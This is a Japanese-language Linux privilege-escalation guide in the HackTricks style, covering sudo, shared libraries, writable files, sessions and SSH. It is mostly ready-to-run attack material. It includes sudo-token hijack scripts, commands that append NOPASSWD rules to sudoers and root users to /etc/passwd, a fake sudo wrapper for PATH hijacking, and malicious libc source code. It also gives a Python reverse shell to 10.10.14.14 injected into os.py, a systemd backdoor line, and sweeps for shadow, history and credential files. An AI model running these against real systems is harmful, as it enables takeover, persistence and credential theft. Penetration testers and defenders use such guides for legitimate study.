[**GTFOBins**](https://gtfobins.github.io) は、攻撃者がローカルのセキュリティ制限を bypass するために悪用できる Unix binary をまとめた curated list です。[**GTFOArgs**](https://gtfoargs.github.io/) は、command に **argument のみを inject できる**場合を対象にした、同様のリストです。

この project では、restricted shell から脱出したり、privilege を escalate または維持したり、file を transfer したり、bind shell や reverse shell を spawn したり、その他の post-exploitation task を容易にしたりするために悪用できる、Unix binary の正規の function を収集しています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` に access できる場合は、[**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) tool を使用して、sudo rule を exploit する方法が見つかるか確認できます。

### Reusing Sudo Tokens

**sudo access はあるものの** password がない場合、**sudo command の実行を待機してから session token を hijack する**ことで privilege を escalate できます。<sup>[[18]](#references)</sup>

privilege を escalate するための requirements:

- user "_sampleuser_" として、すでに shell を取得している
- "_sampleuser_" が **過去 15 分以内に `sudo` を使用している**（デフォルトでは、これは sudo token の有効期間であり、password を入力せずに `sudo` を使用できます）
- `cat /proc/sys/kernel/yama/ptrace_scope` が 0
- `gdb` に access できる（upload できること）

（`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を使用して `ptrace_scope` を一時的に有効化するか、`/etc/sysctl.d/10-ptrace.conf` を変更して `kernel.yama.ptrace_scope = 0` に設定することで、永続的に変更できます）

これらの requirements をすべて満たしている場合、**以下を使用して privilege を escalate できます:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **最初の exploit**（`exploit.sh`）は、_`/tmp`_ に `activate_sudo_token` binary を作成します。これを使用して **session 内の sudo token を activate できます**（root shell が自動的に取得されるわけではないため、`sudo su` を実行してください）:
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **2つ目のexploit**（`exploit_v2.sh`）は、_/tmp_ に **root所有でsetuidが設定された** sh shell を作成します。
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **3つ目のexploit**（`exploit_v3.sh`）は、**sudoersファイルを作成**し、**sudoトークンを無期限にして、すべてのユーザーがsudoを使用できるようにします**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

フォルダまたはフォルダ内に作成されたファイルのいずれかに**書き込み権限**がある場合、[**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) バイナリを使用して、ユーザーと PID 用の sudo token を**作成**できます。\
たとえば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、そのユーザーとして PID 1234 の shell を持っている場合、次の操作を行うことでパスワードを知らなくても**sudo 権限を取得**できます。
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

ファイル `/etc/sudoers` および `/etc/sudoers.d` 内のファイルでは、誰が `sudo` をどのように使用できるかを設定します。これらのファイルは、**デフォルトでは root ユーザーと root グループのみが読み取れます**。\
**このファイルを**読み取れる場合、**興味深い情報を取得できる**可能性があり、いずれかのファイルに**書き込める**場合は、**権限を昇格**できます。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込みが可能なら、この権限を悪用できます。
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD向けの`doas`など、`sudo`バイナリの代替があります。`/etc/doas.conf`の設定を確認することを忘れないでください。
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
`doas` でエディタまたはインタプリタが許可されている場合は、GTFOBins-style escapes を確認します:
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

**ユーザーが通常マシンに接続し、権限昇格のために `sudo` を使用している**ことを知っており、そのユーザーコンテキスト内でシェルを取得した場合、root としてコードを実行した後、ユーザーのコマンドを実行する**新しい sudo executable**を作成できます。その後、ユーザーコンテキストの **$PATH** を変更します（たとえば、`.bash_profile` に新しいパスを追加する）ことで、ユーザーが sudo を実行したときに、作成した sudo executable が実行されるようにします。

ユーザーが異なる shell（bash 以外）を使用している場合は、新しいパスを追加するために別のファイルを変更する必要があります。たとえば、[sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`、`~/.zshrc`、`~/.bash_profile` を変更します。[bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) にも別の例があります。

または、次のようなものを実行します:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は、**ロードされる設定ファイルの場所**を示します。通常、このファイルには次のパスが含まれています: `include /etc/ld.so.conf.d/*.conf`

これは、`/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれることを意味します。これらの設定ファイルは、**ライブラリ**が**検索**される**他のフォルダ**を指します。例えば、`/etc/ld.so.conf.d/libc.conf` の内容は `/usr/local/lib` です。**つまり、システムは `/usr/local/lib` 内でライブラリを検索します**。

何らかの理由で、**ユーザーが**次のいずれかのパスに対する**書き込み権限**を持っている場合: `/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` 内の設定ファイルで指定された任意のフォルダ、そのユーザーは権限を昇格できる可能性があります。\
以下のページで、**この設定ミスを悪用する方法**を確認してください:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib を `/var/tmp/flag15/` にコピーすると、`RPATH` 変数で指定されているため、この場所にあるプログラムによって使用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に、`gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` を使用して、`/var/tmp` に悪意のあるライブラリを作成します。
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## ケイパビリティ

Linux capabilities は、**プロセスに利用可能な root 権限のサブセットを提供します**。これにより、root の **権限がより小さく独立した単位に分割されます**。これらの各単位は、プロセスに個別に付与できます。この方法により、権限の完全なセットが縮小され、exploit のリスクが低減します。\
**capabilities とその abuse 方法について詳しく学ぶ**には、以下のページを読んでください:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## ディレクトリの permissions

ディレクトリでは、**"execute" ビット**により、対象ユーザーがフォルダに "**cd**" できることを意味します。\
**"read" ビット**により、ユーザーは **files** を **list** でき、**"write" ビット**により、ユーザーは新しい **files** を **delete** および **create** できます。

## ACLs

Access Control Lists (ACLs) は、任意アクセス権限の第2層を表し、**従来の ugo/rwx permissions を上書きできます**。これらの permissions により、所有者ではなく、またグループにも属していない特定のユーザーに対して権限を許可または拒否できるため、file またはディレクトリへのアクセスをより細かく制御できます。このレベルの **granularity により、より正確なアクセス管理が可能になります**。詳細については[**こちら**](https://linuxconfig.org/how-to-manage-acls-on-linux)を参照してください。<sup>[[19]](#references)</sup>

user "kali" に file に対する read および write permissions を**付与**します:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
システムから特定のACLを持つファイルを**取得**する：
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### sudoers drop-in における隠れた ACL backdoor

よくある設定ミスの1つは、`/etc/sudoers.d/` 内にある、モード `440` の root 所有ファイルが、ACL によって low-priv user に書き込みアクセスを許可していることです。
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
`user:alice:rw-` のような記述がある場合、制限された mode bits にもかかわらず、そのユーザーは sudo ルールを追記できます。
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
これは、`ls -l` のみを使用したレビューでは見落としやすいため、影響の大きい ACL persistence/privesc の経路です。

## Open shell sessions

**old versions** では、別のユーザー（**root**）の **shell** セッションを **hijack** できる場合があります。\
**newest versions** では、自分のユーザーの **screen** セッションにのみ **connect** できます。ただし、**session 内に興味深い情報** が見つかる可能性があります。

### screen sessions hijacking

**screen セッションを一覧表示する**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![screen sessions hijacking - Socket locations (some systems expose one as symlink of the other): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**セッションに接続**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

これは **old tmux versions** における問題でした。non-privileged user として、root が作成した tmux (v2.1) session を hijack することはできませんでした。

**tmux sessions を一覧表示**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![Socket locations (一部のシステムでは、一方がもう一方のシンボリックリンクとして公開されています) - tmux sessions hijacking: tmux -S /tmp/dev sess ls この socket を使用して一覧表示します。その socket で tmux session を開始できます...](<../../images/image (837).png>)

**セッションにアタッチ**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
**HTBのValentine box**で例を確認してください。

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月から2008年5月13日までの間に Debian based systems（Ubuntu、Kubuntuなど）で生成されたすべての SSL および SSH keys は、この bug の影響を受ける可能性があります。\
この bug は、これらの OS で新しい ssh key を作成する際に発生します。**可能なバリエーションが32,768通りしかなかった**ためです。つまり、すべての可能性を計算でき、**ssh public key があれば対応する private key を検索できます**。計算済みの候補は、こちらで確認できます: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** password authentication を許可するかどうかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** public key authentication を許可するかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: password authentication が許可されている場合に、空の password string を持つアカウントへの login を server が許可するかどうかを指定します。デフォルトは `no` です。

### Login control files

これらの files は、誰が login できるか、またその方法に影響します。

- **`/etc/nologin`**: 存在する場合、root 以外の login をブロックし、その message を表示します。
- **`/etc/securetty`**: root が login できる場所を制限します（TTY allowlist）。
- **`/etc/motd`**: login 後に表示される banner（environment や maintenance details が leak する可能性があります）。

### PermitRootLogin

root が ssh を使用して login できるかどうかを指定します。デフォルトは `no` です。指定可能な値は次のとおりです。

- `yes`: root は password と private key を使用して login できます
- `without-password` または `prohibit-password`: root は private key でのみ login できます
- `forced-commands-only`: root は private key を使用し、commands options が指定されている場合にのみ login できます
- `no` : 不可

### AuthorizedKeysFile

user authentication に使用できる public keys を含む files を指定します。home directory に置き換えられる `%h` などの tokens を含めることができます。**absolute paths**（`/` で始まる）または**user の home からの relative paths**を指定できます。例:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定により、ユーザー "**testusername**" の **private** key で **login** を試行すると、ssh はその key の public key と、`/home/testusername/.ssh/authorized_keys` および `/home/testusername/access` にある key を比較します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding により、**key をサーバー上に残すことなく**（passphrase なし！）、**local SSH keys を使用**できます。つまり、ssh 経由で **host** に **jump** し、そこから **initial host** にある **key を使用して**別の **host** に **jump** できます。

この option を `$HOME/.ssh.config` に次のように設定する必要があります:
```
Host example.com
ForwardAgent yes
```
`Host` が `*` の場合、ユーザーが別のマシンへ移動するたびに、そのホストはキーにアクセスできるため、セキュリティ上の問題になります。

ファイル `/etc/ssh_config` はこの **options** を**上書き**し、この設定を許可または拒否できます。\
ファイル `/etc/sshd_config` はキーワード `AllowAgentForwarding` を使用して ssh-agent forwarding を**許可または拒否**できます（デフォルトは許可）。

環境で Forward Agent が設定されていることが分かった場合は、**権限昇格に悪用できる可能性があるため**、以下のページを確認してください:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### Profile ファイル

ファイル `/etc/profile` と `/etc/profile.d/` 配下のファイルは、**ユーザーが新しい shell を実行したときに実行されるスクリプト**です。したがって、これらのいずれかに対して**書き込みまたは変更ができる場合、権限昇格が可能**です。
```bash
ls -l /etc/profile /etc/profile.d/
```
奇妙な profile script が見つかった場合は、**機密情報**がないか確認してください。

### Passwd/Shadow ファイル

OS によっては、`/etc/passwd` および `/etc/shadow` ファイルで異なる名前が使用されていたり、バックアップが存在したりする場合があります。そのため、**すべて見つけ出し**、ファイルを**読み取れるか確認**して、ファイル内に**ハッシュがあるか**確認することを推奨します。
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、`/etc/passwd`（または同等の）ファイル内に**password hashes**が見つかることがあります
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

まず、以下のコマンドのいずれかを使用してパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
次に、ユーザー `hacker` を追加し、生成されたパスワードを設定します。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで、`hacker:hacker` を使用して `su` コマンドを実行できます。

または、以下の行を使用して、パスワードなしのダミーユーザーを追加できます。\
警告: 現在のマシンのセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注: BSDプラットフォームでは、`/etc/passwd` は `/etc/pwd.db` および `/etc/master.passwd` に、`/etc/shadow` は `/etc/spwd.db` に名前が変更されています。

**重要なファイルに書き込みできるか**を確認してください。例えば、**service configuration file**に書き込みできますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンで **tomcat** サーバーが稼働しており、**/etc/systemd/ 内の Tomcat service configuration file を変更できる場合、**次の行を変更できます:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
次回 tomcat が起動されたときに backdoor が実行されます。

### フォルダを確認

以下のフォルダには、バックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (最後のフォルダはおそらく読み取れませんが、試してみてください)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 不審な場所にあるファイル／所有ファイル
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 直近数分間に変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### SQLite DBファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH 内の Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web files**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### パスワードを含む既知のファイル

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) のコードを読むと、**パスワードを含んでいる可能性のある複数のファイルを検索している**ことがわかります。\
そのために使用できる**もう1つの興味深いツール**は [**LaZagne**](https://github.com/AlessandroZ/LaZagne) です。これは、Windows、Linux、Macのローカルコンピューターに保存されている多数のパスワードを取得するために使用されるオープンソースアプリケーションです。

### ログ

ログを読み取ることができれば、**その中から興味深い/機密性の高い情報を見つけられる**可能性があります。ログが奇妙であればあるほど、より興味深いものになるでしょう（おそらく）。\
また、一部の「**不適切に**」設定された（バックドアが仕掛けられた？）**audit logs**では、この投稿で説明されているように、**パスワードをaudit logs内に記録**できる場合があります: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/)。<sup>[[36]](#references)</sup>
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
ログを**読み取る**には、[**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) **グループ**が非常に役立ちます。

### Shellファイル
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### 一般的な認証情報の検索/正規表現

**password** という単語がファイルの**名前**または**内容**に含まれているファイルも確認し、ログ内の IP やメールアドレス、またはハッシュの正規表現も確認してください。\
ここですべての方法を列挙するつもりはありませんが、興味があれば [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) が実行する最後のチェックを確認できます。

## 書き込み可能なファイル

### Python library hijacking

Python スクリプトが**どこから**実行されるかを把握しており、そのフォルダー内に**書き込み可能**であるか、または **Python libraries** を**変更可能**である場合、OS library を変更して backdoor 化できます（Python スクリプトが実行される場所に書き込み可能であれば、os.py library をコピーして貼り付けます）。

**library を backdoor 化**するには、os.py library の末尾に次の行を追加します（IP と PORT を変更してください）。
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` の脆弱性により、ログファイルまたはその親ディレクトリへの **write permissions** を持つユーザーが、権限を昇格できる可能性があります。これは、通常 **root** として実行される `logrotate` を操作して、特に _**/etc/bash_completion.d/**_ のようなディレクトリ内にある任意のファイルを実行させられる可能性があるためです。_ /var/log_ だけでなく、ログローテーションが適用されるすべてのディレクトリについて、権限を確認することが重要です。

> [!TIP]
> この脆弱性は `logrotate` version `3.18.0` 以前に影響します

この脆弱性の詳細については、次のページを参照してください: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。<sup>[[37]](#references)</sup>

[**logrotten**](https://github.com/whotwagner/logrotten) を使用して、この脆弱性を exploit できます。

この脆弱性は [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** と非常によく似ています。そのため、ログを変更できることがわかった場合は、常にそのログを管理しているユーザーを確認し、ログを symlink に置き換えることで権限を昇格できないか確認してください。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)<sup>[[20]](#references)</sup>

何らかの理由で、ユーザーが _/etc/sysconfig/network-scripts_ に `ifcf-<whatever>` スクリプトを **write** できる、または既存のスクリプトを **adjust** できる場合、**system is pwned** です。<sup>[[20]](#references)</sup>

ネットワークスクリプトは、たとえば _ifcg-eth0_ のようなもので、ネットワーク接続に使用されます。これらは .INI ファイルとまったく同じ形式に見えます。しかし Linux では、Network Manager (dispatcher.d) によって \~sourced\~ されます。

私の場合、これらのネットワークスクリプト内の `NAME=` 属性は正しく処理されません。名前に **white/blank space** が含まれていると、system はその **white/blank space の後の部分を実行しようとします**。つまり、最初の blank space より後の **すべてが root として実行されます**。

例: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Network と /bin/id の間の空白に注意_)

### **init、init.d、systemd、rc.d**

`/etc/init.d` ディレクトリには、**classic Linux service management system** である System V init（SysVinit）用の **scripts** が格納されています。これには、サービスを `start`、`stop`、`restart`、場合によっては `reload` するための scripts が含まれています。これらは直接実行することも、`/etc/rc?.d/` にある symbolic links 経由で実行することもできます。Redhat systems での別のパスは `/etc/rc.d/init.d` です。

一方、`/etc/init` は **Upstart** に関連付けられています。これは Ubuntu が導入した、より新しい **service management** であり、サービス管理タスクに configuration files を使用します。Upstart への移行後も、Upstart の compatibility layer により、SysVinit scripts は Upstart configurations と併用されています。

**systemd** は、現代的な initialization and service manager として登場し、on-demand daemon starting、automount management、system state snapshots などの advanced features を提供します。distribution packages 用のファイルを `/usr/lib/systemd/` に、administrator modifications 用のファイルを `/etc/systemd/system/` に整理し、system administration process を効率化します。<sup>[[21]](#references)</sup>

## Other Tricks

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks は通常、syscall を hook して、privileged kernel functionality を userspace manager に公開します。弱い manager authentication（例：FD-order に基づく signature checks や脆弱な password schemes）により、local app が manager になりすまし、すでに root 化された devices 上で root へ privilege escalation できる可能性があります。詳細と exploitation の情報はこちらをご覧ください。


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations の regex-driven service discovery は、process command lines から binary path を抽出し、privileged context で `-v` とともに実行できます。permissive patterns（例：`\S` の使用）では、writable locations（例：`/tmp/httpd`）に attacker-staged listeners がある場合にそれらと match する可能性があり、root としての execution につながります（CWE-426 Untrusted Search Path）。<sup>[[27]](#references)</sup>

他の discovery/monitoring stacks に適用可能な generalized pattern の詳細と exploitation については、こちらをご覧ください。

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux local privilege escalation vectors を探すための最適な tool:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux と MAC の kernel vulns を enumerate [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Linux Privilege Escalation Guide](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Attack and Defend: Linux Privilege Escalation Techniques of 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [No one expect command execution!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux Privilege Escalation)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Lab Exercises Walkthrough - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Tips and Tricks for Linux Priv Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
